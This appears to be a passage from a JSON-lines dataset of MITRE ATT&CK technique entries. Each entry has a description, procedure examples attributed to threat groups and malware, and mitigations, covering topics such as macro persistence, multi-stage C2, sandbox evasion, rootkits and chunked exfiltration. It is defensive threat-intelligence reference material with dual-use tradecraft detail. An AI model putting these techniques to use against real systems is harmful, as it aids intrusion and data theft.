"entity": "Office Template Macros", "entity_type": "techniques", "entity_context": ["MuddyWater has used a Word Template, Normal.dotm, for persistence.", "Cobalt Strike has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. ", "BackConfig has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.", "Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing.\n\nDisable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing. \n"], "is_subtechnique": true}
{"text": " Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult. Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features. The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.", "idx": "https://attack.mitre.org/techniques/T1104", "title": "Multi-Stage Channels", "entity": "Multi-Stage Channels", "entity_type": "techniques", "entity_context": ["BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.", "The Bazar loader is used to download and execute the Bazar backdoor.", "BACKSPACE attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs \"louder\" interactions with the malware.", "An APT3 downloader first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60.229 on TCP port 81.", "APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.", "MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back. ", "Valak can download additional modules and malware capable of using separate C2 channels.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system."], "is_subtechnique": false}
{"text": " An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).", "idx": "https://attack.mitre.org/techniques/T1204/001", "title": "Malicious Link", "entity": "Malicious Link", "entity_type": "techniques", "entity_context": ["Emotet has relied upon users clicking on a malicious link delivered through spearphishing.", "APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link.", "Hancitor has relied upon users clicking on a malicious link delivered through phishing.", "Kerrdown has gained execution through victims opening malicious links.", "Sidewinder has lured targets to click on malicious links to gain execution in the target environment.", "Magic Hound has attempted to lure victims into opening malicious links embedded in emails.", "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.", "APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.", "ObliqueRAT has gained execution on targeted systems through luring users to click on links to malicious URLs.", "Transparent Tribe has directed users to open URLs hosting malicious content.", "BlackTech has used e-mails with malicious links to lure victims into installing malware.\t ", "FIN7 has used malicious links to lure victims into downloading malware.", "PLEAD has been executed via malicious links in e-mails.", "If a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files.", "FIN8 has used emails with malicious links to lure victims into installing malware.", "APT29 has used various forms of spearphishing attempting to get a user to click on a malicous link.", "Machete has has relied on users opening malicious links delivered through spearphishing to execute malware.", "Melcoz has gained execution through victims opening malicious links.", "NETWIRE has been executed through convincing victims into clicking malicious links.", "Bazar can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.", "Grandoreiro has used malicious links to gain execution on victim machines.", "AppleJeus's spearphishing links required user interaction to navigate to the malicious website.", "Windshift has used links embedded in e-mails to lure victims into executing malicious code.", "Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing.", "TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. ", "If a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.", "Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.", "ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware.", "SpicyOmelette has been executed through malicious links within spearphishing emails.", "Pony has attempted to lure targets into clicking links in spoofed emails from legitimate banks.\t", "Mofang's spearphishing emails required a user to click the link to connect to a compromised website.", "Javali has achieved execution through victims clicking links to malicious websites.", "MuddyWater has distributed URLs in phishing e-mails that link to lure documents.", "Patchwork has used spearphishing with links to try to get users to click, download and open malicious files.", "OilRig has delivered malicious links to achieve execution on the target system.", "APT3 has lured victims into clicking malicious links delivered through spearphishing.", "Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.", "BackConfig has compromised victims via links to URLs hosting malicious content.", "APT32 has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.", "Molerats has sent malicious links via email trick users into opening a RAR archive and running an executable. ", "GuLoader has relied upon users clicking on links to malicious documents.", "Mustang Panda has sent malicious links directing victims to a Google Drive folder.", "Leviathan has sent spearphishing email links attempting to get a user to click.", "Night Dragon enticed users to click on links in spearphishing emails to download malware.", "Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.", "Dragonfly 2.0 has used various forms of spearphishing in attempts to get users to open links.", "TSCookie has been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan.", "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links.", "Turla has used spearphishing via a link to get users to download and run their malware.", "APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails.", "QakBot has gained execution through users opening malicious links.\n", "FIN4 has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).", "SMOKEDHAM has relied upon users clicking on a malicious link delivered through phishing."], "is_subtechnique": true}
{"text": " **This technique has been deprecated and should no longer be used.** Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.", "idx": "https://attack.mitre.org/techniques/T1026", "title": "Multiband Communication", "entity": "Multiband Communication", "entity_type": "techniques", "entity_context": ["Some Lazarus Group malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.", "Cobalt Strike's \"beacon\" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.", "PlugX can be configured to use multiple network protocols to avoid network-based detection.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. "], "is_subtechnique": false}
{"text": " Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "idx": "https://attack.mitre.org/techniques/T1059", "title": "Command and Scripting Interpreter", "entity": "Command and Scripting Interpreter", "entity_type": "techniques", "entity_context": ["Use application control where appropriate.", "DarkComet can execute various types of scripts on the victim’s machine.", "APT37 has used Ruby scripts to execute payloads.", "Imminent Monitor has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.", "FIN7 used SQL scripts to help perform tasks on the victim's machine.", "Where possible, only permit execution of signed scripts.", "PoetRAT has executed a Lua script through a Lua interpreter for Windows.", "Get2 has the ability to run executables with command-line arguments.", "Bandook can support commands to execute Java-based payloads. ", "Fox Kitten has used a Perl reverse shell to communicate with C2.", "Empire uses a command-line interface to interact with systems.", "Zeus Panda can launch remote scripts on the victim’s machine.\t", "Stealth Falcon malware uses WMI to script data collection and command execution on the victim.", "FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.", "When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.", "WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.", "APT32 has used COM scriptlets to download Cobalt Strike beacons.\t", "Malware used by Ke3chang can run commands on the command-line interface.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic and JavaScript scripts from executing potentially malicious downloaded content .", "Bonadan can create bind and reverse shells on the infected system.\t", "gh0st RAT is able to open a remote shell to execute commands.", "Kessel can create a reverse shell between the infected host and a specified system.\t", "SpeakUp uses Perl scripts.", "Matryoshka is capable of providing Meterpreter shell access.", "FIVEHANDS can receive a command line argument to limit file encryption to specified directories.", "Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.", "OilRig has used various types of scripting for execution.", "APT19 downloaded and launched code within a SCT file.", "Melcoz has been distributed through an AutoIt loader script.", "Dragonfly 2.0 used command line for execution.", "CHOPSTICK is capable of performing remote command execution.", "Windigo has used a Perl script for information gathering.", "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.", "Anti-virus can be used to automatically quarantine suspicious files. ", "APT39 has utilized AutoIt and custom scripts to perform internal reconnaissance.", "P.A.S. Webshell has the ability to create reverse shells with Perl scripts.", "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.", "Disable or remove any unnecessary or unused shells or interpreters."], "is_subtechnique": false}
{"text": " Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)", "idx": "https://attack.mitre.org/techniques/T1497/002", "title": "User Activity Based Checks", "entity": "User Activity Based Checks", "entity_type": "techniques", "entity_context": ["Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments. ", "Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code. ", "Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.", "FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes."], "is_subtechnique": true}
{"text": " **This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.** Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts. Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them. Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)", "idx": "https://attack.mitre.org/techniques/T1064", "title": "Scripting", "entity": "Scripting", "entity_type": "techniques", "entity_context": ["Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.", "Configure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy.  Other types of virtualization and application microsegmentation may also mitigate the impact of compromise."], "is_subtechnique": false}
{"text": " Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.", "idx": "https://attack.mitre.org/techniques/T1087", "title": "Account Discovery", "entity": "Account Discovery", "entity_type": "techniques", "entity_context": ["Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > Policies > Administrative Templates > Windows Components > Credential User Interface: E numerate administrator accounts on elevation. ", "APT29 obtained a list of users and their roles from an Exchange server using <code>Get-ManagementRoleAssignment</code>.", "ShimRatReporter listed all non-privileged and privileged accounts available on the machine.", "XCSSET attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data."], "is_subtechnique": false}
{"text": " Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview) Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Since macOS Catalina 10.15, kernel extensions have been deprecated on macOS systems.(Citation: Apple Kernel Extension Deprecation) Adversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir) (Citation: Trend Micro Skidmap)", "idx": "https://attack.mitre.org/techniques/T1547/006", "title": "Kernel Modules and Extensions", "entity": "Kernel Modules and Extensions", "entity_type": "techniques", "entity_context": ["Limit access to the root account and prevent users from loading kernel modules and extensions through proper privilege separation and limiting Privilege Escalation opportunities.", "Drovorub can use kernel modules to establish persistence.", "Skidmap has the ability to install several loadable kernel modules (LKMs) on infected machines.", "Application control and software restriction tools, such as SELinux, KSPP, grsecurity MODHARDEN, and Linux kernel tuning can aid in restricting kernel module loading. Since macOS High Sierra 10.13, Secure Kernel Extension Loading (SKEL) can also be used to restrict the loading of kernel modules.", "Common tools for detecting Linux rootkits include: rkhunter , chrootkit , although rootkits may be designed to evade certain detection tools."], "is_subtechnique": true}
{"text": " Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).", "idx": "https://attack.mitre.org/techniques/T1222", "title": "File and Directory Permissions Modification", "entity": "File and Directory Permissions Modification", "entity_type": "techniques", "entity_context": ["OSX_OCEANLOTUS.D has changed permissions of a second-stage payload to an executable via <code>chmod</code>.", "Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality.", "Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists."], "is_subtechnique": false}
{"text": " Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees. Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).", "idx": "https://attack.mitre.org/techniques/T1589/002", "title": "Email Addresses", "entity": "Email Addresses", "entity_type": "techniques", "entity_context": ["MuddyWater has specifically targeted government agency employees with spearphishing e-mails.\t ", "Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.", "APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware.", "Silent Librarian has collected e-mail addresses from targeted organizations from open Internet searches.", "HAFNIUM has collected e-mail addresses for users they intended to target.", "Kimsuky has collected valid email addresses that were subsequently used in spearphishing campaigns.", "TA551 has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "Magic Hound has acquired the personal email addresses of some individuals they intend to target."], "is_subtechnique": true}
{"text": " Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes) Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)", "idx": "https://attack.mitre.org/techniques/T1078/001", "title": "Default Accounts", "entity": "Default Accounts", "entity_type": "techniques", "entity_context": ["Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. ", "Stuxnet infected WinCC machines via a hardcoded database server password.", "HyperStack can use default credentials to connect to IPC$ shares on remote machines."], "is_subtechnique": true}
{"text": " Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "idx": "https://attack.mitre.org/techniques/T1573", "title": "Encrypted Channel", "entity": "Encrypted Channel", "entity_type": "techniques", "entity_context": ["Tropic Trooper has encrypted traffic with the C2 to prevent network detection.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols.", "NETWIRE can encrypt C2 communications.", "Cryptoistic can engage in encrypted communications with C2.", "gh0st RAT\thas encrypted TCP communications to evade detection.", "Chaes has used encryption for its C2 channel. "], "is_subtechnique": false}
{"text": " Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition) Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions. Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS) Once the extension is installed, it can browse to websites in the background,(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser (including credentials)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have", "idx": "https://attack.mitre.org/techniques/T1176", "title": "Browser Extensions", "entity": "Browser Extensions", "entity_type": "techniques", "entity_context": [" Ensure extensions that are installed are the intended ones as many malicious extensions will masquerade as legitimate ones.", "Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.", "Set a browser extension allow or deny list as appropriate for your security policy. ", "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run.", "Grandoreiro can use malicious browser extensions to steal cookies and other user information.", "Only install browser extensions from trusted sources that can be verified. Browser extensions for some browsers can be controlled through Group Policy. Change settings to prevent the browser from installing extensions without sufficient permissions.", "Bundlore can install malicious browser extensions that are used to hijack user searches.", "OSX/Shlayer can install malicious Safari browser extensions to serve ads.", "Ensure operating systems and browsers are using the most current version. "], "is_subtechnique": false}
{"text": " Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017) Adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces. There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)", "idx": "https://attack.mitre.org/techniques/T1534", "title": "Internal Spearphishing", "entity": "Internal Spearphishing", "entity_type": "techniques", "entity_context": ["Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.", "Leviathan has conducted internal spearphishing within the victim's environment for lateral movement."], "is_subtechnique": false}
{"text": " Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos. Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).", "idx": "https://attack.mitre.org/techniques/T1586/001", "title": "Social Media Accounts", "entity": "Social Media Accounts", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Leviathan has compromised social media accounts to conduct social engineering attacks."], "is_subtechnique": true}
{"text": " Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access. Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)", "idx": "https://attack.mitre.org/techniques/T1606", "title": "Forge Web Credentials", "entity": "Forge Web Credentials", "entity_type": "techniques", "entity_context": ["Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed.\n \nEnable advanced auditing on ADFS. Check the success and failure audit options in the ADFS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object.", "Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles.", "Restrict permissions and access to the AD FS server to only originate from privileged access workstations.", "Configure browsers/applications to regularly delete persistent web credentials (such as cookies)."], "is_subtechnique": false}
{"text": " An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.", "idx": "https://attack.mitre.org/techniques/T1030", "title": "Data Transfer Size Limits", "entity": "Data Transfer Size Limits", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.", "APT28 has split archived exfiltration files into chunks smaller than 1MB.", "Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.", "RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions.\t", "Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes .", "Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.", "POSHSPY uploads data in 2048-byte chunks.", "ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration.", "Threat Group-3390 actors have split RAR files for exfiltration into parts.", "OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.", "Cobalt Strike will break large data sets into smaller chunks for exfiltration."], "is_subtechnique": false}
